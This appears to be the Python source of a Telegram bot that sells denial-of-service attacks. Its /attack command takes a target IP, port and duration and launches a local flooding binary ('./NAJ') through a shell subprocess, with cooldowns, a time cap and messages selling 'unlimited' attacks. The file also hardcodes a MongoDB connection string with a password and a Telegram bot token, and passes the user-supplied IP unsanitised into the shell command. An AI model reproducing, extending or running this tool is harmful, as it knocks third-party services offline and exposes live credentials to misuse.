import os
import asyncio
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from pymongo import MongoClient
from telegram.error import TelegramError

MONGO_URI = 'mongodb+srv://Magic:Spike@cluster0.fa68l.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI)
db = client['TEST']
users_collection = db['VIP']

TELEGRAM_BOT_TOKEN = '8143624194:AAH_fO1xL22rPxOgorrA1EcZIRWoKlDTJMY'

# Dictionary to track user-specific cooldowns
user_cooldowns = {}

COOLDOWN_PERIOD = 5 * 60  # 10 minutes in seconds
MAX_ATTACK_DURATION = 70  # Maximum duration in seconds

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to @SHYAM_hacker bot 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
     #   "*Maximum duration allowed: 70 seconds.*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, user_id, context):
    try:
        # Simulate attack using subprocess
        process = await asyncio.create_subprocess_shell(
            f"./NAJ {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        # Mark the cooldown as over for this user's attack
        if user_id in user_cooldowns and (ip, port) in user_cooldowns[user_id]:
            user_cooldowns[user_id][(ip, port)]["active"] = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def start_cooldown_timer(chat_id, ip, port, user_id, context):
    """
    Sends a live countdown timer to the user during their cooldown period.
    """
    cooldown_info = user_cooldowns[user_id][(ip, port)]
    while True:
        remaining_time = int(COOLDOWN_PERIOD - (time.time() - cooldown_info["timestamp"]))
        if remaining_time <= 0:
            await context.bot.send_message(chat_id=chat_id, text=f"*✅ Cooldown ended! You can now attack {ip}:{port} again.*", parse_mode='Markdown')
            break

        minutes, seconds = divmod(remaining_time, 60)
        timer_message = f"*⏳ Cooldown Active!*\n*You can attack {ip}:{port} again in {minutes} minutes and {seconds} seconds.*"
        
        # Edit the cooldown message or send a new one
        if "message_id" in cooldown_info:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=cooldown_info["message_id"],
                    text=timer_message,
                    parse_mode='Markdown'
                )
            except TelegramError:
                pass
        else:
            message = await context.bot.send_message(chat_id=chat_id, text=timer_message, parse_mode='Markdown')
            cooldown_info["message_id"] = message.message_id
        
        await asyncio.sleep(1)

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the user's unique ID

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    port = int(port)  # Ensure the port is an integer
    duration = int(duration)  # Ensure the duration is an integer

    # Check if the duration exceeds the maximum allowed limit
    if duration > MAX_ATTACK_DURATION:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ Maximum attack duration is {MAX_ATTACK_DURATION} seconds. DM to buy :- @SHYAM_hacker for unlimited seconds !*", parse_mode='Markdown')
        return

    # Initialize cooldowns for the user if not present
    if user_id not in user_cooldowns:
        user_cooldowns[user_id] = {}

    # Check cooldown for this user and IP-port combination
    current_time = time.time()
    if (ip, port) in user_cooldowns[user_id]:
        last_attack_time = user_cooldowns[user_id][(ip, port)]["timestamp"]
        is_active = user_cooldowns[user_id][(ip, port)]["active"]

        if is_active:
            await context.bot.send_message(chat_id=chat_id, text=f"*❌ You have already attacked this IP and PORT 👎! {ip}:{port}.DM to buy :- @SHYAM_hacker for unlimited attack!*", parse_mode='Markdown')
            return

        if current_time - last_attack_time < COOLDOWN_PERIOD:
            # Start a live timer for the cooldown
            await start_cooldown_timer(chat_id, ip, port, user_id, context)
            return

    # Mark the IP-port as under attack for this user
    user_cooldowns[user_id][(ip, port)] = {
        "timestamp": current_time,
        "active": True,
        "message_id": None  # For the live timer
    }
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*Attack by @SHYAM_hacker!*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, user_id, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()